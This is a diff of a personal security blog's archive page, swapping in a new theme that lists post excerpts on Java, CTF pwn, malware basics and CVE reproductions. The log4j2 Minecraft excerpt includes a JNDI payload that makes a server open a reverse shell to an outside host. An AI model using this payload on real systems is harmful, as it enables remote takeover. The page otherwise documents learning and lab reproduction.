@@ -1,7 +1,236 @@
-<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin</title><meta name="description" content="A Blog Powered By Hexo"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
-</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2022/04/01/spring4shell/">【漏洞复现】CVE-2022-22965 Spring4Shell复现与调试</a></h3><div class="article__date metadata"><div class="post-info">2022/04/01</div></div><div class="article__body"><p>wayback没有镜像，自己备份的md找不到了，只有PDF存档</p></div><a class="article__link" href="/2022/04/01/spring4shell/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2022/03/19/java-day3-JDBC/">JavaWeb笔记-JDBC</a></h3><div class="article__date metadata"><div class="post-info">2022/03/19</div></div><div class="article__body"><ul>
-<li>基本概念</li>
-<li>快速入门</li>
-<li>对JDBC中各个接口和类详解</li>
-</ul></div><a class="article__link" href="/2022/03/19/java-day3-JDBC/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2022/03/18/java-d2-database/">JavaWeb笔记-数据库</a></h3><div class="article__date metadata"><div class="post-info">2022/03/18</div></div><div class="article__body"></div><a class="article__link" href="/2022/03/18/java-d2-database/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2022/03/16/java-d1-annotation/">JavaWeb笔记-注解</a></h3><div class="article__date metadata"><div class="post-info">2022/03/16</div></div><div class="article__body"><p>注释部分</p></div><a class="article__link" href="/2022/03/16/java-d1-annotation/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2022/03/16/java-d1-Junit/">JavaWeb笔记-Junit与反射</a></h3><div class="article__date metadata"><div class="post-info">2022/03/16</div></div><div class="article__body"><p>Junit单元测试与反射</p>
-<p>黑盒-白盒</p></div><a class="article__link" href="/2022/03/16/java-d1-Junit/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2021/12/12/log4j2-minecraft-rce/">【漏洞复现】minecraft 中的 log4j2 rce</a></h3><div class="article__date metadata"><div class="post-info">2021/12/12</div></div><div class="article__body"><p>log4j 还是1day的时候，对minecraft服务器进行漏洞调试</p></div><a class="article__link" href="/2021/12/12/log4j2-minecraft-rce/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2021/03/30/Maleware/">【免杀】C++恶意软件入门笔记</a></h3><div class="article__date metadata"><div class="post-info">2021/03/30</div></div><div class="article__body"><p>C++恶意软件入门笔记，高中看的一本书，大二小小实践一下</p></div><a class="article__link" href="/2021/03/30/Maleware/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/2021/03/14/BUUCTF/">BUUCTF Pwn WriteUp</a></h3><div class="article__date metadata"><div class="post-info">2021/03/14</div></div><div class="article__body"><p>buu部分刷题记录</p></div><a class="article__link" href="/2021/03/14/BUUCTF/">read more ...</a></section><section class="article"><h3 class="article__title"><a class="article__title__link" href="/1990/09/26/1d64d36c186dc96562565d0e0c2d50ecca86a0deace8b42b2aead214934a7a42/">计算机系统安全-板书</a></h3><div class="article__date metadata"><div class="post-info">1990/09/26</div></div><div class="article__body"></div><a class="article__link" href="/1990/09/26/1d64d36c186dc96562565d0e0c2d50ecca86a0deace8b42b2aead214934a7a42/">read more ...</a></section><div class="pagination"><a class="pagination__link pagination__prev" href="/page/7/">prev</a></div></main><footer class="footer metadata"><p class="footer__text">© 2026 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Joe1sn's Cabin</title><meta name="author" content="Joe1sn"><meta name="copyright" content="Joe1sn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="Joe1sn&#39;s Cabin">
+<meta property="og:url" content="https://joe1sn.eu.org/page/8/index.html">
+<meta property="og:site_name" content="Joe1sn&#39;s Cabin">
+<meta property="og:locale">
+<meta property="og:image" content="https://joe1sn.eu.org/img/avatar1.jpg">
+<meta property="article:author" content="Joe1sn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://joe1sn.eu.org/img/avatar1.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.svg"><link rel="canonical" href="https://joe1sn.eu.org/page/8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Joe1sn\'s Cabin',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
+</head><body><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/cyber_nijia.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Joe1sn's Cabin</span></a></span><div id="menus"></div></nav><div id="site-info"><h1 id="site-title">Joe1sn's Cabin</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/Joe1sn" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:joe1sn23333@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/04/01/spring4shell/" title="【漏洞复现】CVE-2022-22965 Spring4Shell复现与调试">【漏洞复现】CVE-2022-22965 Spring4Shell复现与调试</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-04-01T03:05:20.000Z" title="Created 2022-04-01 11:05:20">2022-04-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CVE/">CVE</a></span></div><div class="content">wayback没有镜像，自己备份的md找不到了，只有PDF存档  https://joe1sn.top/spring4shell.pdf </div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/03/19/java-day3-JDBC/" title="JavaWeb笔记-JDBC"><img class="post-bg" src="/./img/java-logo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaWeb笔记-JDBC"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/19/java-day3-JDBC/" title="JavaWeb笔记-JDBC">JavaWeb笔记-JDBC</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-03-19T11:49:07.000Z" title="Created 2022-03-19 19:49:07">2022-03-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/">notes</a><i class="fas fa-angle-right article-meta-link"></i><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/java/">java</a></span></div><div class="content"> 基本概念 快速入门 对JDBC中各个接口和类详解    JDBC概念  **概念：**Java DataBase Connectivity ，Java数据库连接  本质（类似Django的ORM）:The sun公司定义的一套操作所有关系型数据库的规则（接口）。各个厂家根据接口去实现。我们可以是有这套接口编程，真正的驱动时jar包中的实现类   快速入门 简单步骤  导入驱动jar包 注册驱动 数据库连接对象Connection 定义sql 获取执行SQL语句的Statement对象 执行sql，接受返回结果 处理结果 释放资源  简单使用 123456789101112131415161718192021222324252627282930package learn.jdbc;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;/*JDBC快速入门 */public class JdbcDemo1 &#123;    public static void main...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/03/18/java-d2-database/" title="JavaWeb笔记-数据库"><img class="post-bg" src="/./img/java-logo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaWeb笔记-数据库"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/18/java-d2-database/" title="JavaWeb笔记-数据库">JavaWeb笔记-数据库</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-03-18T08:26:12.000Z" title="Created 2022-03-18 16:26:12">2022-03-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/">notes</a><i class="fas fa-angle-right article-meta-link"></i><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/java/">java</a></span></div><div class="content">  SQL分类   数据查询语言（DQL） 数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有FROM，WHERE，GROUP BY，HAVING和ORDER BY。这些DQL保留字常与其他类型的SQL语句一起使用。   数据定义语言（DDL）(CRUD) 数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由CREATE、ALTER与DROP三个语法所组成，最早是由 Codasyl (Conference on Data Systems Languages) 数据模型开始，现在被纳入 SQL 指令中作为其中一个子集。   数据操纵语言（DML） 数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DE...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/03/16/java-d1-annotation/" title="JavaWeb笔记-注解"><img class="post-bg" src="/./img/java-logo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaWeb笔记-注解"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/16/java-d1-annotation/" title="JavaWeb笔记-注解">JavaWeb笔记-注解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-03-16T12:49:29.000Z" title="Created 2022-03-16 20:49:29">2022-03-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/">notes</a><i class="fas fa-angle-right article-meta-link"></i><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/java/">java</a></span></div><div class="content">注释部分   注解 概念：说明程序。For计算机  从JDK1.5开始，Java增加对元数据的支持，也就是注解，注解与注释是有一定区别的，可以把注解理解为代码里的特殊标记，这些标记可以在编译，类加载，运行时被读取，并执行相应的处理。通过注解开发人员可以在不改变原有代码和逻辑的情况下在源代码中嵌入补充信息。   注释：用文字描述程序。For程序员    作用   编写文档：标识生成doc文档 1234567891011121314package LearnJunit.annotation;/** * 注解 java doc演示 * @since 1.5  * @author joe1sn * @version 1.0 */public class AnnoDemo1 &#123;    //计算两数之和    public int add(int a, int b)&#123;        return a+b;    &#125;&#125; javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8 12345678910111...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/03/16/java-d1-Junit/" title="JavaWeb笔记-Junit与反射"><img class="post-bg" src="/./img/java-logo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaWeb笔记-Junit与反射"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/16/java-d1-Junit/" title="JavaWeb笔记-Junit与反射">JavaWeb笔记-Junit与反射</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-03-15T23:27:53.000Z" title="Created 2022-03-16 07:27:53">2022-03-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/">notes</a><i class="fas fa-angle-right article-meta-link"></i><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/notes/java/">java</a></span></div><div class="content">Junit单元测试与反射 黑盒-白盒   junit使用：白盒测试 步骤：  定义一个测试类  测试类名：被测试类+Test CalculatorTest 包名：xxx.xxx.xxx.test   定义测试方法：可以独立执行，建议  方法名：test测试方法名 testAdd() 返回值：void（独立运行） 参数列表：空参   方法+@test注解 导入Junit依赖环境  1234567891011121314151617package test;import junit.Calculator;import org.junit.Test;public class CalculatorTest &#123;    //测试add方法    @Test    public void testAdd()&#123;        //System.out.printf(&quot;Excuted&quot;);        //创建计算器对象        Calculator c = new Calculator();        //2.调用add方法        in...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/12/12/log4j2-minecraft-rce/" title="【漏洞复现】minecraft 中的 log4j2 rce"><img class="post-bg" src="/img/kali.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞复现】minecraft 中的 log4j2 rce"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/12/log4j2-minecraft-rce/" title="【漏洞复现】minecraft 中的 log4j2 rce">【漏洞复现】minecraft 中的 log4j2 rce</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-12-12T04:18:49.000Z" title="Created 2021-12-12 12:18:49">2021-12-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CVE/">CVE</a></span></div><div class="content">log4j 还是1day的时候，对minecraft服务器进行漏洞调试   环境搭建 在服务器上搭建了mc服务端，这个照着网上的教程做的 这里用的不是官方包，而是这个：https://www.joe1sn.top/server.jar  java版本是 123openjdk version &quot;1.8.0_162&quot;OpenJDK Runtime Environment (build 1.8.0_162-8u162-b12-1-b12)OpenJDK 64-Bit Server VM (build 25.162-b12, mixed mode) 特意换的老版本  开始攻击  这里使用了https://github.com/feihong-cs/JNDIExploit这个工具 在本地搭建ngrok代理本地的监听端口  然后生成利用EXP 1$&#123;jndi:ldap://150.158.75.102:1389/Basic/ReverseShell/3.133.207.110/13605&#125; 登陆服务器在聊天框中输入 回车等待后getshell  但是服...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/03/30/Maleware/" title="【免杀】C++恶意软件入门笔记"><img class="post-bg" src="/img/top_back.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【免杀】C++恶意软件入门笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/30/Maleware/" title="【免杀】C++恶意软件入门笔记">【免杀】C++恶意软件入门笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-30T03:01:00.000Z" title="Created 2021-03-30 11:01:00">2021-03-30</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/program/">program</a></span></div><div class="content">C++恶意软件入门笔记，高中看的一本书，大二小小实践一下   简单的Windows API   复制自身到Windows目录  1-1.获得程序自生API DWORD GetModuleFileName 1-2.获得windows目录 UINT GetWindowsDirectory 1-3.拷贝文件 BOOL CopyFile    获得系统基本参数   2-1.获得操作系统版本 BOOL GetVersionEx   typedef struct _OSVERSIONINFOA &#123;          DWORD dwOSVersionInfoSize;          DWORD dwMajorVersion;          DWORD dwMinorVersion;          DWORD dwBuildNumber;          DWORD dwPlatformId;          CHAR   szCSDVersion[128];     // Maintenance string for PSS usage      &#125; OS...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/03/14/BUUCTF/" title="BUUCTF Pwn WriteUp"><img class="post-bg" src="/img/BUUCTF.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF Pwn WriteUp"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/14/BUUCTF/" title="BUUCTF Pwn WriteUp">BUUCTF Pwn WriteUp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-14T01:21:00.000Z" title="Created 2021-03-14 09:21:00">2021-03-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/writeup/">writeup</a></span></div><div class="content">buu部分刷题记录   [HarekazeCTF2019]baby_rop  1.checksec() 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  2.IDA main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [rsp+0h] [rbp-10h]  system(&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;);  __isoc99_scanf(&quot;%s&quot;, &amp;v4);  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);  return 0;&#125;  scan...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/1990/09/26/1d64d36c186dc96562565d0e0c2d50ecca86a0deace8b42b2aead214934a7a42/" title="计算机系统安全-板书">计算机系统安全-板书</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="1990-09-26T07:43:58.000Z" title="Created 1990-09-26 15:43:58">1990-09-26</time></span></div><div class="content"> 硬件安全  第一节课    第二节课    PUF：https://www.puftech.com/index.do?introduce       </div></div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/7/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/#content-inner">7</a><span class="page-number current">8</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Joe1sn</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Joe1sn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Joe1sn" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:joe1sn23333@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">lue lue lue</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2098/12/31/develop_handbook/" title="【置顶】【编程】开发笔记"><img src="/img/git.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【置顶】【编程】开发笔记"/></a><div class="content"><a class="title" href="/2098/12/31/develop_handbook/" title="【置顶】【编程】开发笔记">【置顶】【编程】开发笔记</a><time datetime="2098-12-31T13:06:45.000Z" title="Created 2098-12-31 21:06:45">2098-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/11/windows-kernel-driver-12-hook-full-ssdt/" title="windows内核驱动 12-内核hook-1.5"><img src="/img/cover/winhook.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows内核驱动 12-内核hook-1.5"/></a><div class="content"><a class="title" href="/2026/04/11/windows-kernel-driver-12-hook-full-ssdt/" title="windows内核驱动 12-内核hook-1.5">windows内核驱动 12-内核hook-1.5</a><time datetime="2026-04-11T13:38:10.000Z" title="Created 2026-04-11 21:38:10">2026-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/15/windows-kernel-driver-11-hook-inline-ssdt/" title="windows内核驱动 11-内核hook-1"><img src="/img/cover/winhook.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows内核驱动 11-内核hook-1"/></a><div class="content"><a class="title" href="/2026/03/15/windows-kernel-driver-11-hook-inline-ssdt/" title="windows内核驱动 11-内核hook-1">windows内核驱动 11-内核hook-1</a><time datetime="2026-03-15T05:36:14.000Z" title="Created 2026-03-15 13:36:14">2026-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/07/windows-kernel-driver-10-anti-reg-process-protect/" title="windows内核驱动 10-对抗进程回调保护与注册表回调保护"><img src="/img/win.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows内核驱动 10-对抗进程回调保护与注册表回调保护"/></a><div class="content"><a class="title" href="/2026/03/07/windows-kernel-driver-10-anti-reg-process-protect/" title="windows内核驱动 10-对抗进程回调保护与注册表回调保护">windows内核驱动 10-对抗进程回调保护与注册表回调保护</a><time datetime="2026-03-07T05:40:50.000Z" title="Created 2026-03-07 13:40:50">2026-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/06/windows-kernel-driver-9-proccallbackprotect/" title="windows内核驱动 9-进程回调保护与注册表回调保护"><img src="/img/win.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows内核驱动 9-进程回调保护与注册表回调保护"/></a><div class="content"><a class="title" href="/2026/03/06/windows-kernel-driver-9-proccallbackprotect/" title="windows内核驱动 9-进程回调保护与注册表回调保护">windows内核驱动 9-进程回调保护与注册表回调保护</a><time datetime="2026-03-06T11:50:57.000Z" title="Created 2026-03-06 19:50:57">2026-03-06</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>Categories</span>
+            <a class="card-more-btn" href="/categories/" title="View More">
+      <i class="fas fa-angle-right"></i></a>
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE/"><span class="card-category-list-name">CVE</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/hardware/"><span class="card-category-list-name">hardware</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/misc/"><span class="card-category-list-name">misc</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/notes/"><span class="card-category-list-name">notes</span><span class="card-category-list-count">49</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/notes/java/"><span class="card-category-list-name">java</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/notes/kernel/"><span class="card-category-list-name">kernel</span><span class="card-category-list-count">14</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/notes/os/"><span class="card-category-list-name">os</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/program/"><span class="card-category-list-name">program</span><span class="card-category-list-count">9</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/hardware/" style="font-size: 1.14em; color: #999b9d">hardware</a> <a href="/tags/CTF/" style="font-size: 1.14em; color: #999b9d">CTF</a> <a href="/tags/dbg/" style="font-size: 1.1em; color: #999">dbg</a> <a href="/tags/web-framework/" style="font-size: 1.14em; color: #999b9d">web framework</a> <a href="/tags/cheats/" style="font-size: 1.1em; color: #999">cheats</a> <a href="/tags/python/" style="font-size: 1.1em; color: #999">python</a> <a href="/tags/c/" style="font-size: 1.1em; color: #999">c</a> <a href="/tags/cve/" style="font-size: 1.19em; color: #999da1">cve</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 1.1em; color: #999">漏洞挖掘</a> <a href="/tags/fuzz/" style="font-size: 1.28em; color: #99a0aa">fuzz</a> <a href="/tags/stm32/" style="font-size: 1.1em; color: #999">stm32</a> <a href="/tags/windows/" style="font-size: 1.5em; color: #99a9bf">windows</a> <a href="/tags/MinHook/" style="font-size: 1.14em; color: #999b9d">MinHook</a> <a href="/tags/CVE/" style="font-size: 1.37em; color: #99a4b2">CVE</a> <a href="/tags/cpp/" style="font-size: 1.1em; color: #999">cpp</a> <a href="/tags/source/" style="font-size: 1.19em; color: #999da1">source</a> <a href="/tags/pwn/" style="font-size: 1.41em; color: #99a5b7">pwn</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.14em; color: #999b9d">漏洞复现</a> <a href="/tags/os/" style="font-size: 1.1em; color: #999">os</a> <a href="/tags/rootkit/" style="font-size: 1.23em; color: #999ea6">rootkit</a> <a href="/tags/git/" style="font-size: 1.1em; color: #999">git</a> <a href="/tags/C/" style="font-size: 1.28em; color: #99a0aa">C</a> <a 